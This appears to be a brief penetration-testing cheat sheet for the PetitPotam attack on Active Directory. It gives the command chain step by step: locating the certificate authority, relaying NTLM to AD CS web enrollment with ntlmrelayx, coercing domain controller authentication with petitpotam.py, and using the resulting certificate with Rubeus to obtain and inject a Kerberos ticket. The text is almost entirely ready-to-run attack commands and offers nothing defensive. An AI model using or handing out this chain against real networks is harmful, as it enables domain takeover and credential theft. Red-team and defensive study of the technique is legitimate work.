### Source
https://github.com/ollypwn/PetitPotam  

### Find certificate autthority
```
certutil.exe
```

### Set up ntlm relay (forward incoming authentication from domain controller to certificate authority)
```
python3 ntlmrelayx.py -t http://<certificateAuthority>/certsrv/certfnsh.asp -smb2support --adcs
```

### Trigger authentication from domain controller
```
python3 petitpotam.py '<lhost>' '<domainController>'
```

### Request kerberos TGT
```
Rubeus.exe asktgt /outfile:<file> /user:<domainController> /ptt /certificate:<base64Certificate>
```

